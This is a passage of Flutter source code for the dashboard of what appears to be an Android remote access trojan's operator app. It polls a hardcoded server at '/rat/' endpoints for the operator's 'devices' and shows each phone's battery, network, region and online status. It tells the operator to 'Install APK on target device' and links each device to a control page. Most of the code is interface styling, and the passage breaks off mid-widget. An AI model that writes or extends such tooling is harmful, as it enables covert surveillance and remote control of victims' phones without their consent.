// device_dashboard.dart - Real-time Battery, Device Name, Network & Region (MODERN REDESIGN)
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';
import 'package:connectivity_plus/connectivity_plus.dart';

// ─── BASE URL ──────────────────────────────────────────────────────────────
const String _kBase = 'http://shinoa-cpanelpanel.xtxintax.my.id:2003';

// ─── THEME (Aurora Glass – Modern, Soft, Elegan) ───────────────────────────
class _Theme {
  // Primary palette
  static const primary = Color(0xFF7C5CFF);
  static const primaryDeep = Color(0xFF5B3FE0);
  static const primaryLight = Color(0xFFB8A6FF);
  static const primaryGlow = Color(0x337C5CFF);
  static const accent = Color(0xFF00D9C0);
  static const accentGlow = Color(0x3300D9C0);

  // Backgrounds
  static const bg = Color(0xFFF7F5FF);
  static const bgStart = Color(0xFFFAF8FF);
  static const bgEnd = Color(0xFFEDE7FF);
  static const surface = Color(0xFFFFFFFF);
  static const card = Color(0xFFFFFFFF);
  static const glass = Color(0xF2FFFFFF);

  // Text
  static const text = Color(0xFF14132B);
  static const textSub = Color(0xFF5F5C82);
  static const textDim = Color(0xFF9C99BD);

  // Borders & shadows
  static const border = Color(0xFFE8E3FA);
  static const shadow = Color(0x147C5CFF);
  static const shadowDeep = Color(0x227C5CFF);

  // Status
  static const success = Color(0xFF19C37D);
  static const successGlow = Color(0x3319C37D);
  static const warning = Color(0xFFFFA94D);
  static const error = Color(0xFFFF5C7A);
  static const errorGlow = Color(0x33FF5C7A);

  // Legacy aliases (kept for compatibility with rest of codebase)
  static const purple = primary;
  static const cyan = accent;
  static const orange = warning;
  static const secondary = primaryLight;
}

// ─── MAIN DASHBOARD ────────────────────────────────────────────────────────
class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
    super.key,
    this.username = '',
    this.role = '',
    this.sessionKey = '',
  });
  @override
  State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage>
    with TickerProviderStateMixin {
  List<dynamic> _devices = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  PermissionResult? _perm;
  Timer? _timer;
  late AnimationController _animController;
  late AnimationController _pulseController;
  late AnimationController _bgController;
  int _selectedBottomIndex = 0;
  ConnectivityResult _connectivity = ConnectivityResult.none;
  StreamSubscription? _connectivitySub;

  bool get _isOwner =>
      widget.role.toLowerCase() == 'owner' ||
      widget.role.toLowerCase() == 'owner_utama';

  @override
  void initState() {
    super.initState();

    _animController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 700),
    );

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1800),
    )..repeat(reverse: true);

    _bgController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 12),
    )..repeat();

    _animController.forward();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 10), (_) => _loadAll());
    _checkConnectivity();

    // Dummy device for testing
    Future.delayed(const Duration(seconds: 2), () {
      if (_devices.isEmpty && mounted) {
        setState(() {
          _devices.add({
            'id': 'DEV-TEST-001',
            'model': '📱 Test Device',
            'battery': 87,
            'online': true,
            'network': 'WiFi',
            'region': 'Jakarta, ID',
            'lastSeen': DateTime.now().toIso8601String(),
            'owner': widget.username,
          });
        });
      }
    });
  }

  @override
  void dispose() {
    _timer?.cancel();
    _connectivitySub?.cancel();
    _animController.dispose();
    _pulseController.dispose();
    _bgController.dispose();
    super.dispose();
  }

  Future<void> _checkConnectivity() async {
    final result = await Connectivity().checkConnectivity();
    ConnectivityResult finalResult;
    if (result is List<ConnectivityResult>) {
      finalResult = result.isNotEmpty ? result.first : ConnectivityResult.none;
    } else {
      finalResult = result as ConnectivityResult;
    }
    if (mounted) setState(() => _connectivity = finalResult);

    _connectivitySub = Connectivity().onConnectivityChanged.listen((result) {
      ConnectivityResult newResult;
      if (result is List<ConnectivityResult>) {
        newResult = result.isNotEmpty ? result.first : ConnectivityResult.none;
      } else {
        newResult = result as ConnectivityResult;
      }
      if (mounted) setState(() => _connectivity = newResult);
    });
  }

  Future<void> _loadAll() async {
    if (!mounted) return;
    setState(() => _loading = true);

    try {
      // Pairing ID
      final pRes = await http
          .get(Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          final newPairId = pd['pairId'].toString();
          if (mounted && newPairId.isNotEmpty) {
            setState(() => _pairId = newPairId);
          }
        }
      }

      // Devices
      final dRes = await http
          .get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      List<dynamic> devices = [];
      if (dRes.statusCode == 200) {
        final body = jsonDecode(dRes.body);
        if (body['valid'] == true) {
          devices = List<dynamic>.from(body['devices'] ?? []);
        }
      }

      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) {
          d['online'] = false;
        }
        if (d['network'] == null) {
          d['network'] = d['online'] ? 'WiFi' : 'Offline';
        }
        if (d['region'] == null) {
          d['region'] = d['online'] ? 'Unknown' : 'Offline';
        }
      }

      if (devices.isEmpty) {
        devices.add({
          'id': 'DEV-TEST-001',
          'model': '📱 Test Device',
          'battery': 87,
          'online': true,
          'network': 'WiFi',
          'region': 'Jakarta, ID',
          'lastSeen': DateTime.now().toIso8601String(),
          'owner': widget.username,
        });
      }

      PermissionResult perm;
      if (_isOwner) {
        perm = PermissionResult(approved: true, allDevices: true, devices: []);
      } else {
        perm = await DevicePermissionStore.getFor(
            widget.username, widget.sessionKey);
      }

      if (mounted) {
        setState(() {
          _devices = devices;
          _perm = perm;
          _loading = false;
          _errorMsg = null;
        });
        _animController.reset();
        _animController.forward();
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _loading = false;
          _errorMsg = e.toString();
          if (_devices.isEmpty) {
            _devices.add({
              'id': 'DEV-TEST-001',
              'model': '📱 Test Device',
              'battery': 87,
              'online': true,
              'network': 'WiFi',
              'region': 'Jakarta, ID',
              'lastSeen': DateTime.now().toIso8601String(),
              'owner': widget.username,
            });
          }
        });
      }
    }
  }

  int get _activeCount => _devices.where((d) => d['online'] == true).length;

  void _copyPairId() {
    if (_pairId.isEmpty) {
      _showSnackBar('Pairing ID not available', Icons.error, _Theme.error);
      return;
    }
    Clipboard.setData(ClipboardData(text: _pairId));
    _showSnackBar('Pairing ID copied!', Icons.check_circle, _Theme.success);
  }

  void _showSnackBar(String msg, IconData icon, Color color) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(icon, color: Colors.white, size: 18),
            const SizedBox(width: 10),
            Expanded(
              child: Text(
                msg,
                style: const TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ),
          ],
        ),
        backgroundColor: color,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(14),
        ),
        margin: const EdgeInsets.all(16),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  // ─── NAVIGASI ─────────────────────────────────────────────────────────────
  void _onBottomTap(int index) {
    setState(() => _selectedBottomIndex = index);
    switch (index) {
      case 0:
        _loadAll();
        break;
      case 1:
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (_) => _ControlHubPage(
              devices: _devices,
              role: widget.role,
            ),
          ),
        );
        break;
      case 2:
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (_) => DevicePermissionManagerPage(
              sessionKey: widget.sessionKey,
              allDevices: _devices,
            ),
          ),
        ).then((_) => _loadAll());
        break;
    }
  }

  // ─── BUILD ────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    final denied = _perm != null && !_perm!.approved && !_isOwner;

    return Scaffold(
      backgroundColor: _Theme.bg,
      body: Stack(
        children: [
          _buildAnimatedBackground(),
          SafeArea(
            child: FadeTransition(
              opacity: _animController,
              child: Column(
                children: [
                  _buildHeader(),
                  _buildPairIdCard(),
                  _buildStatusBanner(denied),
                  Expanded(
                    child: _loading
                        ? _buildLoadingState()
                        : _devices.isEmpty
                            ? _buildEmptyState(denied)
                            : _buildDeviceGrid(),
                  ),
                  _buildBottomNav(),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── ANIMATED AURORA BACKGROUND ─────────────────────────────────────────
  Widget _buildAnimatedBackground() {
    return AnimatedBuilder(
      animation: _bgController,
      builder: (ctx, _) {
        final t = _bgController.value;
        return Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: const [
                _Theme.bgStart,
                _Theme.bgEnd,
                _Theme.bgStart,
              ],
              stops: [0.0, 0.5 + (t * 0.1), 1.0],
            ),
          ),
          child: Stack(
            children: [
              Positioned(
                top: -120 + (t * 40),
                right: -80,
                child: _blurOrb(220, _Theme.primary.withOpacity(0.18)),
              ),
              Positioned(
                bottom: -100 + (t * 60),
                left: -60,
                child: _blurOrb(260, _Theme.accent.withOpacity(0.12)),
              ),
              Positioned(
                top: 200 + (t * 30),
                left: -100,
                child: _blurOrb(180, _Theme.primaryLight.withOpacity(0.15)),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _blurOrb(double size, Color color) {
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: RadialGradient(
          colors: [color, color.withOpacity(0.0)],
        ),
      ),
    );
  }

  // ─── HEADER ──────────────────────────────────────────────────────────────
  Widget _buildHeader() {
    IconData networkIcon;
    Color networkColor;
    switch (_connectivity) {
      case ConnectivityResult.wifi:
        networkIcon = Icons.wifi_rounded;
        networkColor = _Theme.success;
        break;
      case ConnectivityResult.mobile:
        networkIcon = Icons.signal_cellular_alt_rounded;
        networkColor = _Theme.success;
        break;
      default:
        networkIcon = Icons.signal_cellular_off_rounded;
        networkColor = _Theme.error;
        break;
    }

    final online = _activeCount > 0;

    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 12),
      child: Row(
        children: [
          // Avatar with pulse ring
          AnimatedBuilder(
            animation: _pulseController,
            builder: (ctx, child) {
              return Stack(
                alignment: Alignment.center,
                children: [
                  if (online)
                    Container(
                      width: 60 + (_pulseController.value * 8),
                      height: 60 + (_pulseController.value * 8),
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: _Theme.success
                            .withOpacity(0.15 * (1 - _pulseController.value)),
                      ),
                    ),
                  child!,
                ],
              );
            },
            child: Container(
              width: 54,
              height: 54,
              decoration: BoxDecoration(
                gradient: const LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [_Theme.primary, _Theme.primaryLight],
                ),
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: _Theme.primary.withOpacity(0.35),
                    blurRadius: 16,
                    offset: const Offset(0, 6),
                  ),
                ],
              ),
              child: Center(
                child: Text(
                  widget.username.isNotEmpty
                      ? widget.username[0].toUpperCase()
                      : '?',
                  style: const TextStyle(
                    color: Colors.white,
                    fontSize: 22,
                    fontWeight: FontWeight.w800,
                    letterSpacing: 0.5,
                  ),
                ),
              ),
            ),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Flexible(
                      child: Text(
                        '@${widget.username}',
                        style: const TextStyle(
                          color: _Theme.text,
                          fontSize: 17,
                          fontWeight: FontWeight.w800,
                          letterSpacing: -0.2,
                        ),
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                    const SizedBox(width: 8),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 8, vertical: 3),
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [
                            _Theme.primary.withOpacity(0.12),
                            _Theme.accent.withOpacity(0.12),
                          ],
                        ),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(
                          color: _Theme.primary.withOpacity(0.15),
                        ),
                      ),
                      child: Text(
                        widget.role.toUpperCase(),
                        style: const TextStyle(
                          color: _Theme.primary,
                          fontSize: 9,
                          fontWeight: FontWeight.w800,
                          letterSpacing: 0.6,
                        ),
                      ),
                    ),
                    const Spacer(),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 8, vertical: 3),
                      decoration: BoxDecoration(
                        color: networkColor.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(networkIcon, color: networkColor, size: 12),
                          const SizedBox(width: 4),
                          Text(
                            _connectivity == ConnectivityResult.none
                                ? 'Offline'
                                : 'Online',
                            style: TextStyle(
                              color: networkColor,
                              fontSize: 10,
                              fontWeight: FontWeight.w700,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Row(
                  children: [
                    AnimatedBuilder(
                      animation: _pulseController,
                      builder: (ctx, _) {
                        return Container(
                          width: 8,
                          height: 8,
                          decoration: BoxDecoration(
                            color: online ? _Theme.success : _Theme.textDim,
                            shape: BoxShape.circle,
                            boxShadow: online
                                ? [
                                    BoxShadow(
                                      color: _Theme.success.withOpacity(
                                          0.4 + (_pulseController.value * 0.3)),
                                      blurRadius: 8,
                                      spreadRadius: 1,
                                    ),
                                  ]
                                : [],
                          ),
                        );
                      },
                    ),
                    const SizedBox(width: 6),
                    Text(
                      online
                          ? '$_activeCount device online'
                          : 'No device online',
                      style: TextStyle(
                        color: online ? _Theme.textSub : _Theme.textDim,
                        fontSize: 13,
                        fontWeight: FontWeight.w500,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
          const SizedBox(width: 8),
          GestureDetector(
            onTap: () => _loadAll(),
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: Colors.white,
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: _Theme.shadowDeep,
                    blurRadius: 10,
                    offset: const Offset(0, 3),
                  ),
                ],
              ),
              child: const Icon(
                Icons.refresh_rounded,
                color: _Theme.primary,
                size: 22,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── PAIRING ID CARD ────────────────────────────────────────────────────
  Widget _buildPairIdCard() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 6),
      child: GestureDetector(
        onTap: _copyPairId,
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                Colors.white,
                _Theme.primary.withOpacity(0.04),
              ],
            ),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: _Theme.border, width: 1.2),
            boxShadow: [
              BoxShadow(
                color: _Theme.shadowDeep,
                blurRadius: 16,
                offset: const Offset(0, 6),
              ),
            ],
          ),
          child: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(11),
                decoration: BoxDecoration(
                  gradient: const LinearGradient(
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                    colors: [_Theme.primary, _Theme.primaryLight],
                  ),
                  borderRadius: BorderRadius.circular(13),
                  boxShadow: [
                    BoxShadow(
                      color: _Theme.primary.withOpacity(0.3),
                      blurRadius: 8,
                      offset: const Offset(0, 3),
                    ),
                  ],
                ),
                child: const Icon(
                  Icons.vpn_key_rounded,
                  color: Colors.white,
                  size: 20,
                ),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      'PAIRING ID',
                      style: TextStyle(
                        color: _Theme.textDim,
                        fontSize: 10,
                        fontWeight: FontWeight.w800,
                        letterSpacing: 1.2,
                      ),
                    ),
                    const SizedBox(height: 3),
                    Text(
                      _pairId.isEmpty ? 'Not available' : _pairId,
                      style: TextStyle(
                        color:
                            _pairId.isEmpty ? _Theme.textDim : _Theme.text,
                        fontSize: 16,
                        fontWeight: FontWeight.w800,
                        fontFamily: 'Astral',
                        letterSpacing: 1.6,
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                padding: const EdgeInsets.symmetric(
                    horizontal: 10, vertical: 8),
                decoration: BoxDecoration(
                  color: _pairId.isEmpty
                      ? _Theme.textDim.withOpacity(0.06)
                      : _Theme.primary.withOpacity(0.08),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(
                      Icons.copy_rounded,
                      color: _pairId.isEmpty
                          ? _Theme.textDim.withOpacity(0.4)
                          : _Theme.primary,
                      size: 16,
                    ),
                    const SizedBox(height: 2),
                    Text(
                      'COPY',
                      style: TextStyle(
                        color: _pairId.isEmpty
                            ? _Theme.textDim.withOpacity(0.4)
                            : _Theme.primary,
                        fontSize: 8,
                        fontWeight: FontWeight.w800,
                        letterSpacing: 0.8,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── STATUS BANNER ──────────────────────────────────────────────────────
  Widget _buildStatusBanner(bool denied) {
    if (_errorMsg != null) {
      return _buildBanner(Icons.error_rounded, _errorMsg!, _Theme.error);
    }
    if (denied) {
      return _buildBanner(
        Icons.lock_rounded,
        'Access not approved. Contact owner to get access.',
        _Theme.warning,
      );
    }
    if (!_isOwner && _perm != null && _perm!.approved) {
      return _buildBanner(
        Icons.check_circle_rounded,
        'Access granted. You can see shared devices.',
        _Theme.success,
      );
    }
    return const SizedBox(height: 4);
  }

  Widget _buildBanner(IconData icon, String msg, Color color) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 20, vertical: 6),
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      decoration: BoxDecoration(
        color: color.withOpacity(0.08),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: color.withOpacity(0.18), width: 1.2),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: color.withOpacity(0.15),
              shape: BoxShape.circle,
            ),
            child: Icon(icon, color: color, size: 14),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Text(
              msg,
              style: TextStyle(
                color: color,
                fontSize: 12,
                height: 1.3,
                fontWeight: FontWeight.w600,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── LOADING STATE ──────────────────────────────────────────────────────
  Widget _buildLoadingState() {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          SizedBox(
            width: 44,
            height: 44,
            child: CircularProgressIndicator(
              valueColor:
                  const AlwaysStoppedAnimation(_Theme.primary),
              strokeWidth: 3,
              backgroundColor: _Theme.primary.withOpacity(0.1),
            ),
          ),
          const SizedBox(height: 18),
          const Text(
            'Loading devices...',
            style: TextStyle(
              color: _Theme.textSub,
              fontSize: 13,
              fontWeight: FontWeight.w600,
            ),
          ),
        ],
      ),
    );
  }

  // ─── EMPTY STATE ─────────────────────────────────────────────────────────
  Widget _buildEmptyState(bool denied) {
    return Center(
      child: SingleChildScrollView(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(26),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [
                    Colors.white,
                    denied
                        ? _Theme.warning.withOpacity(0.08)
                        : _Theme.primary.withOpacity(0.06),
                  ],
                ),
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: _Theme.shadowDeep,
                    blurRadius: 20,
                    offset: const Offset(0, 6),
                  ),
                ],
              ),
              child: Icon(
                denied ? Icons.lock_rounded : Icons.devices_rounded,
                color: denied
                    ? _Theme.warning.withOpacity(0.6)
                    : _Theme.primary,
                size: 48,
              ),
            ),
            const SizedBox(height: 22),
            Text(
              denied ? 'Access Denied' : 'No Devices',
              style: TextStyle(
                color: denied ? _Theme.warning : _Theme.text,
                fontSize: 18,
                fontWeight: FontWeight.w800,
                letterSpacing: -0.3,
              ),
            ),
            const SizedBox(height: 8),
            Text(
              denied
                  ? 'Contact owner for access'
                  : 'No device connected yet',
              style: const TextStyle(
                color: _Theme.textSub,
                fontSize: 13,
                fontWeight: FontWeight.w500,
              ),
            ),
            if (!denied) ...[
              const SizedBox(height: 26),
              Container(
                margin: const EdgeInsets.symmetric(horizontal: 8),
                padding: const EdgeInsets.all(18),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: _Theme.border, width: 1.2),
                  boxShadow: [
                    BoxShadow(
                      color: _Theme.shadowDeep,
                      blurRadius: 14,
                      offset: const Offset(0, 4),
                    ),
                  ],
                ),
                child: Column(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: _Theme.primary.withOpacity(0.1),
                        shape: BoxShape.circle,
                      ),
                      child: const Icon(
                        Icons.info_outline_rounded,
                        color: _Theme.primary,
                        size: 20,
                      ),
                    ),
                    const SizedBox(height: 10),
                    const Text(
                      'How to connect device',
                      style: TextStyle(
                        color: _Theme.text,
                        fontSize: 13,
                        fontWeight: FontWeight.w800,
                      ),
                    ),
                    const SizedBox(height: 10),
                    const Text(
                      '1. Install APK on target device\n'
                      '2. Open APK → enter Pairing ID above\n'
                      '3. Device will appear here automatically',
                      style: TextStyle(
                        color: _Theme.textSub,
                        fontSize: 11.5,
                        height: 1.7,
                        fontWeight: FontWeight.w500,
                      ),
                      textAlign: TextAlign.center,
                    ),
                  ],
                ),
              ),
            ],
          ],
        ),
      ),
    );
  }

  // ─── DEVICE GRID ─────────────────────────────────────────────────────────
  Widget _buildDeviceGrid() {
    return GridView.builder(
      padding: const EdgeInsets.fromLTRB(16, 8, 16, 110),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2,
        crossAxisSpacing: 14,
        mainAxisSpacing: 14,
        childAspectRatio: 0.78,
      ),
      itemCount: _devices.length,
      itemBuilder: (ctx, i) {
        final d = _devices[i];
        final on = d['online'] == true;
        return TweenAnimationBuilder<double>(
          tween: Tween(begin: 0.0, end: 1.0),
          duration: Duration(milliseconds: 350 + (i * 60)),
          curve: Curves.easeOutCubic,
          builder: (ctx, val, child) {
            return Transform.translate(
              offset: Offset(0, 20 * (1 - val)),
              child: Opacity(opacity: val, child: child),
            );
          },
          child: _buildDeviceCard(d, on),
        );
      },
    );
  }

  Widget _buildDeviceCard(Map<String, dynamic> d, bool on) {
    final battery = d['battery'] ?? 0;
    IconData batteryIcon;
    Color batteryColor;
    if (battery >= 70) {
      batteryIcon = Icons.battery_full_rounded;
      batteryColor = _Theme.success;
    } else if (battery >= 30) {
      batteryIcon = Icons.battery_3_bar_rounded;
      batteryColor = _Theme.warning;
    } else {
      batteryIcon = Icons.battery_alert_rounded;
      batteryColor = _Theme.error;
    }

    // Network
    final network = d['network']?.toString() ?? (on ? 'WiFi' : 'Offline');
    IconData networkIcon;
    Color networkColor;
    if (network.toLowerCase().contains('wifi')) {
      networkIcon = Icons.wifi_rounded;
      networkColor = _Theme.primary;
    } else if (network.toLowerCase().contains('4g') ||
        network.toLowerCase().contains('lte')) {
      networkIcon = Icons.signal_cellular_alt_rounded;
      networkColor = _Theme.primary;
    } else if (network.toLowerCase().contains('5g')) {
      networkIcon = Icons.signal_cellular_alt_2_bar_rounded;
      networkColor = _Theme.primary;
    } else {
      networkIcon = Icons.signal_cellular_off_rounded;
      networkColor = _Theme.textDim;
    }

    // Region
    final region = d['region']?.toString() ?? 'Unknown';

    // Last seen
    String lastSeen = 'Never';
    if (d['lastSeen'] != null) {
      try {
        final seen = DateTime.parse(d['lastSeen'].toString());
        final diff = DateTime.now().difference(seen);
        if (diff.inSeconds < 60) {
          lastSeen = 'Just now';
        } else if (diff.inMinutes < 60) {
          lastSeen = '${diff.inMinutes}m ago';
        } else if (diff.inHours < 24) {
          lastSeen = '${diff.inHours}h ago';
        } else {
          lastSeen = '${diff.inDays}d ago';
        }
      } catch (_) {
        lastSeen = 'Unknown';
      }
    }

    final idStr = d['id']?.toString() ?? '-';
    final shortId =
        idStr.length > 8 ? idStr.substring(0, 8) : idStr;

    return GestureDetector(
      onTap: () {
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (_) => ControlCenterPage(
              targetDevice: d,
              role: widget.role,
            ),
          ),
        );
      },
      child: Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Colors.white,
              on
                  ? _Theme.primary.withOpacity(0.03)
                  : Colors.white,
            ],
          ),
          borderRadius: BorderRadius.circular(22),
          border: Border.all(
            color: on
                ? _Theme.primary.withOpacity(0.15)
                : _Theme.border,
            width: 1.2,
          ),
          boxShadow: [
            BoxShadow(
              color: on
                  ? _Theme.primary.withOpacity(0.12)
                  : _Theme.shadowDeep,
              blurRadius: on ? 16 : 10,
              offset: const Offset(0, 5),
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Container(
                  padding: const EdgeInsets.all(9),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                      colors: on
                          ? [
                              _Theme.primary.withOpacity(0.12),
                              _Theme.accent.withOpacity(0.12),
                            ]
                          : [
                              _Theme.textDim.withOpacity(0.08),
                              _Theme.textDim.withOpacity(0.04),
                            ],
                    ),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Icon(
                    Icons.phone_android_rounded,
                    color: on ? _Theme.primary : _Theme.textDim,
                    size: 18,
                  ),
                ),
                _buildStatusBadge(on),
              ],
            ),
            const Spacer(),
            Text(
              d['model'] ?? 'Unknown',
              style: const TextStyle(
                color: _Theme.text,
                fontSize: 14,
                fontWeight: FontWeight.w800,
                letterSpacing: -0.2,
              ),
              maxLines: 1,
              overflow: TextOverflow.ellipsis,
            ),
            const SizedBox(height: 3),
            Container(
              padding: const EdgeInsets.symmetric(
                  horizontal: 6, vertical: 2),
              decoration: BoxDecoration(
                color: _Theme.bg,
                borderRadius: BorderRadius.circular(6),
              ),
              child: Text(
                shortId,
                style: const TextStyle(
                  color: _Theme.textDim,
                  fontSize: 9,
                  fontFamily: 'Astral',
                  letterSpacing: 0.8,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ),
            const SizedBox(height: 5),
            Row(
              children: [
                const Icon(
                  Icons.location_on_rounded,
                  color: _Theme.textDim,
                  size: 11,
                ),
                const SizedBox(width: 3),
                Expanded(
                  child: Text(
                    region,
                    style: const TextStyle(
                      color: _Theme.textSub,
                      fontSize: 10,
                      fontWeight: FontWeight.w500,
                    ),
                    overflow: TextOverflow.ellipsis,
                  ),
                ),
              ],
            ),
            const Spacer(),
            Container(
              padding: const EdgeInsets.symmetric(
                  horizontal: 10, vertical: 8),
              decoration: BoxDecoration(
                color: _Theme.bg,
                borderRadius: BorderRadius.circular(12),
              ),
              child: Row(
                children: [
                  Icon(batteryIcon, color: batteryColor, size: 15),
                  const SizedBox(width: 4),
                  Text(
                    '$battery%',
                    style: TextStyle(
                      color: batteryColor,
                      fontSize: 11,
                      fontWeight: FontWeight.w800,
                    ),
                  ),
                  const SizedBox(width: 8),
                  Icon(networkIcon, color: networkColor, size: 14),
                  const Spacer(),
                  Text(
                    lastSeen,
                    style: const TextStyle(
                      color: _Theme.textDim,
                      fontSize: 9,
                      fontWeight: FontWeight.w600,
                    ),
                    overflow: TextOverflow.ellipsis,
                  ),
                ],
              ),
            ),
            const SizedBox(height: 8),
            Container(
              width: double.infinity,
              padding: const EdgeInsets.symmetric(vertical: 8),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: on
                      ? [_Theme.primary, _Theme.primaryLight]
                      : [
                          _Theme.textDim.withOpacity(0.3),
                          _Theme.textDim.withOpacity(0.2),
                        ],
                ),
                borderRadius: BorderRadius.circular(11),
                boxShadow: on
                    ? [
                        BoxShadow(
                          color: _Theme.primary.withOpacity(0.25),
                          blurRadius: 8,
                          offset: const Offset(0, 3),
                        ),
                      ]
                    : [],
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(
                    on
                        ? Icons.arrow_forward_rounded
                        : Icons.power_off_rounded,
                    color: Colors.white,
                    size: 13,
                  ),
                  const SizedBox(width: 5),
                  Text(
                    on ? 'OPEN' : 'OFFLINE',
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 10,
                      fontWeight: FontWeight.w800,
                      letterSpacing: 1.0,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStatusBadge(bool on) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 5),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: on
              ? [
                  _Theme.success.withOpacity(0.12),
                  _Theme.success.withOpacity(0.06),
                ]
              : [
                  _Theme.error.withOpacity(0.12),
                  _Theme.error.withOpacity(0.06),
                ],
        ),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(
          color:
              (on ? _Theme.success : _Theme.error).withOpacity(0.25),
        ),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 6,
            height: 6,
            decoration: BoxDecoration(
